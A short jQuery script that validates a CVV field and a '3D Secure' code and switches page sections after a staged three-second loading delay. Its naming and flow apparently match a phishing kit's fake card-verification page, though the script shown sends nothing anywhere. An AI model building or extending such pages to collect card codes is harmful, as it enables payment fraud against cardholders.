jQuery(function() {
  $("#Cvv").mask("9999");
})

$(document).ready(function() {
  $("#bntvbv").click(function() {
    var xCvv = $("#Cvv").val();
    var x3Dsecure = $("#3Ds").val();
    var xStart;
    if (xCvv === "") {
      xStart = false;
    }
    if (x3Dsecure === "" || x3Dsecure.length < 4) {
      xStart = false;
    }
    if (xStart === false) {
      alert("Please check your entries and try again");
      return false;
    } else {
      document.getElementById("3dpage").className = "show";
      document.getElementById("3dweb").className = "hide";
    }
  })
})
window.onload = function() {
  setTimeout(function() {
    document.getElementById("3dweb").className = "";
    document.getElementById("3dpage").className = "hide";
  }, 3000)
}
